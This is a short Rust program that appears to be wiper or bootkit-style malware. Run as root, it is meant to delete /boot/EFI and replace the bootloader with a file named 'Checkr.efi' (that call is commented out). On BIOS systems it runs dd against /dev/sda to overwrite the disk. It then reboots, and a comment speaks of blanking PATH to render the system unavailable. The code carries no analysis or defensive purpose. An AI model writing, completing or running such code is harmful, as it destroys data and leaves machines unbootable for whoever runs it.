use std::fmt::Debug;
use std::process;
use colored::Colorize;
use nix::unistd::Uid;
use std::fs;
use std::path;
use std::env;
use serde::de::Deserializer;

mod log;

fn copytoefi() -> Result<(), std::io::Error> {
    fs::remove_dir_all("/boot/EFI/").expect("failed to remove dirs");
    fs::create_dir_all("/boot/EFI/BOOT/").expect("failed to create dirs");
    fs::copy("Checkr.efi", "/boot/EFI/BOOT/BOOTX64.EFI").expect("failed to copy file");
    Ok(())
}

fn main() {
    env::set_var("VERBOSE", "1");
    log::verbose("Starting up");

    let uid:bool = Uid::effective().is_root();
    if !uid {
        log::error("Program is not running as root, please run as root");
        process::exit(42);
    }
    //*Checks if system is booted in uefi. if it is it copies the Checkr.efi file over to EFI/boot/bootx64.efi. if not it writes raw data to the disk
    if path::Path::new("/sys/firmware/efi").exists() {
      log::info("uefi detected");
      //  copytoefi().expect("failed to copy file");
    }
    else{
        log::info("bios detected");
        let dd = process::Command::new("dd").arg("if=").arg("of=/dev/sda").spawn();
        if dd.is_err() {
            log::error("failed to write to disk.");

        }
    }

    //*Set path var to an empty string to render the system unavailable.
    //env::set_var("PATH", "");

    //*Finally it reboots the computer.
    let reboot = process::Command::new("reboot").spawn();
    if reboot.is_err() {
        log::error("failed to reboot");
    }

    process::exit(0);
}
